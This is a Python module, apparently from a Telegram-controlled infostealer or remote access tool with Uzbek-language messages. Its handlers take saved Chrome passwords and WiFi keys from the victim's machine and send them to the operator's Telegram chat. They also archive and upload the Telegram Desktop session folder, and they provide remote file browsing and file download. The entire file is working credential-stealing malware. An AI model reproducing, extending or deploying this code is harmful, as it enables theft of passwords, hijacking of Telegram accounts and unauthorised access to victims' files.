# client_handlers/files.py - v3.0.5 FILE HANDLERS
"""
📁 File System Handlers (Non-Blocking)
- Password extraction (Chrome, WiFi)
- Telegram data
- File browser
- Upload/Download
"""

import asyncio
import io
import os
import time
import logging
from pathlib import Path
from typing import Optional

from telethon import events
from telethon.tl.custom import Button

logger = logging.getLogger(__name__)


def register_file_handlers(client, ctx):
    """Register file-related handlers"""
    
    admin_id = ctx.admin_id
    
    # ==================== CHROME PASSWORDS ====================
    @client.on(events.CallbackQuery(data=b"browser"))
    async def browser_passwords_handler(event):
        """Extract Chrome passwords"""
        if event.sender_id != admin_id:
            return
        
        await event.answer("🔐 Parollar olinmoqda...")
        
        from utils import get_chrome_passwords
        passwords = await get_chrome_passwords()
        
        if not passwords:
            await client.send_message(event.chat_id, "❌ Parollar topilmadi")
            return
        
        if 'error' in passwords[0]:
            await client.send_message(event.chat_id, f"❌ {passwords[0]['error']}")
            return
        
        # Format passwords
        message = f"🔐 **Chrome Parollar ({len(passwords)})**\n\n"
        
        for i, p in enumerate(passwords[:20], 1):
            url = p['url'][:40] if len(p['url']) > 40 else p['url']
            message += f"{i}. {url}\n"
            message += f"   👤 `{p['username']}`\n"
            message += f"   🔑 `{p['password']}`\n\n"
        
        if len(passwords) > 20:
            message += f"\n... +{len(passwords) - 20} ta yana"
        
        # Send as file if too long
        if len(message) > 4000:
            file_content = "CHROME PASSWORDS\n" + "="*50 + "\n\n"
            for p in passwords:
                file_content += f"URL: {p['url']}\n"
                file_content += f"Username: {p['username']}\n"
                file_content += f"Password: {p['password']}\n"
                file_content += "-"*30 + "\n"
            
            await client.send_file(
                event.chat_id,
                io.BytesIO(file_content.encode('utf-8')),
                caption=f"🔐 Chrome Parollar ({len(passwords)})",
                file_name=f"passwords_{time.strftime('%Y%m%d_%H%M%S')}.txt"
            )
        else:
            await client.send_message(event.chat_id, message)
    
    @client.on(events.CallbackQuery(data=b"broadcast_browser"))
    async def broadcast_browser_handler(event):
        """Broadcast Chrome passwords"""
        if event.sender_id != admin_id:
            return
        event._chat_id = admin_id
        await browser_passwords_handler(event)
    
    # ==================== WIFI PASSWORDS ====================
    @client.on(events.CallbackQuery(data=b"wifi"))
    async def wifi_passwords_handler(event):
        """Extract WiFi passwords"""
        if event.sender_id != admin_id:
            return
        
        await event.answer("📡 WiFi parollar olinmoqda...")
        
        from utils import get_wifi_passwords
        passwords = await get_wifi_passwords()
        
        if not passwords:
            await client.send_message(event.chat_id, "❌ WiFi tarmoqlar topilmadi")
            return
        
        if 'error' in passwords[0]:
            await client.send_message(event.chat_id, f"❌ {passwords[0]['error']}")
            return
        
        message = f"📡 **WiFi Parollar ({len(passwords)})**\n\n"
        
        for p in passwords:
            message += f"📶 `{p['ssid']}`\n"
            message += f"🔑 `{p['password']}`\n\n"
        
        await client.send_message(
            event.chat_id, message,
            buttons=[[Button.inline("🔙 Ortga", b"back_to_main")]]
        )
    
    @client.on(events.CallbackQuery(data=b"broadcast_wifi"))
    async def broadcast_wifi_handler(event):
        """Broadcast WiFi passwords"""
        if event.sender_id != admin_id:
            return
        event._chat_id = admin_id
        await wifi_passwords_handler(event)
    
    # ==================== TELEGRAM DATA ====================
    @client.on(events.CallbackQuery(data=b"tdata"))
    async def tdata_handler(event):
        """Extract Telegram tdata"""
        if event.sender_id != admin_id:
            return
        
        await event.answer("💾 Telegram ma'lumotlari...")
        
        try:
            from utils import run_blocking, make_archive
            
            # Find tdata folder
            tdata_path = Path(os.environ['APPDATA']) / 'Telegram Desktop' / 'tdata'
            
            if not tdata_path.exists():
                await client.send_message(
                    event.chat_id,
                    "❌ Telegram Desktop topilmadi"
                )
                return
            
            await client.send_message(event.chat_id, "📦 Arxivlanmoqda... (bu biroz vaqt oladi)")
            
            # Create archive in temp folder - non-blocking!
            temp_archive = Path(os.environ['TEMP']) / f"tdata_{int(time.time())}"
            
            archive_path = await make_archive(str(tdata_path), str(temp_archive))
            
            if archive_path and Path(archive_path).exists():
                # Check size
                size = Path(archive_path).stat().st_size
                
                if size > 50 * 1024 * 1024:  # 50MB limit
                    await client.send_message(
                        event.chat_id,
                        f"⚠️ Fayl juda katta ({size / 1024 / 1024:.1f} MB)\n"
                        "Telegram 50MB dan katta fayllarni qabul qilmaydi"
                    )
                else:
                    await client.send_file(
                        event.chat_id,
                        archive_path,
                        caption=f"💾 Telegram tdata ({size / 1024 / 1024:.1f} MB)"
                    )
                
                # Cleanup
                Path(archive_path).unlink(missing_ok=True)
            else:
                await client.send_message(event.chat_id, "❌ Arxivlashda xatolik")
                
        except Exception as e:
            logger.error(f"Tdata error: {e}")
            await client.send_message(event.chat_id, f"❌ {e}")
    
    @client.on(events.CallbackQuery(data=b"broadcast_tdata"))
    async def broadcast_tdata_handler(event):
        """Broadcast tdata"""
        if event.sender_id != admin_id:
            return
        event._chat_id = admin_id
        await tdata_handler(event)
    
    # ==================== FILE BROWSER ====================
    @client.on(events.CallbackQuery(data=b"file_explorer"))
    async def file_explorer_handler(event):
        """Open file browser"""
        if event.sender_id != admin_id:
            return
        
        ctx.user_state['current_path'] = 'C:\\'
        await show_directory(client, event.chat_id, 'C:\\')
    
    async def show_directory(client, chat_id, path: str):
        """Show directory contents"""
        from utils import list_directory
        
        items = await list_directory(path)
        
        if items and 'error' in items[0]:
            await client.send_message(chat_id, f"❌ {items[0]['error']}")
            return
        
        message = f"📂 **{path}**\n\n"
        
        # Directories first
        dirs = [i for i in items if i['is_dir']][:15]
        files = [i for i in items if not i['is_dir']][:15]
        
        for d in dirs:
            message += f"📁 `{d['name']}`\n"
        
        for f in files:
            size_kb = f['size'] / 1024
            message += f"📄 `{f['name']}` ({size_kb:.1f} KB)\n"
        
        if len(items) > 30:
            message += f"\n... +{len(items) - 30} ta yana"
        
        buttons = [
            [Button.inline("📤 Yuklash", b"file_download_prompt")],
            [Button.inline("🔙 Ortga", b"back_to_main")]
        ]
        
        await client.send_message(chat_id, message, buttons=buttons)
    
    @client.on(events.CallbackQuery(data=b"file_download_prompt"))
    async def file_download_prompt_handler(event):
        """Prompt for file path to download"""
        if event.sender_id != admin_id:
            return
        
        ctx.user_state['waiting_for'] = 'file_path'
        
        await event.edit(
            "📤 **Fayl Yuklash**\n\n"
            "To'liq yo'lni yuboring:\n"
            "Masalan: `C:\\Users\\User\\Desktop\\file.txt`",
            buttons=[[Button.inline("❌ Bekor", b"back_to_main")]]
        )
    
    # ==================== BROWSER SEARCH ====================
    @client.on(events.CallbackQuery(data=b"browser_search_prompt"))
    async def browser_search_prompt_handler(event):
        """Prompt for browser search"""
        if event.sender_id != admin_id:
            return
        
        ctx.user_state['waiting_for'] = 'browser_search'
        
        await event.edit(
            "🌐 **Brauzerda Qidirish**\n\n"
            "Qidiruv so'zini yuboring:",
            buttons=[[Button.inline("❌ Bekor", b"back_to_main")]]
        )
    
    logger.info("File handlers registered")
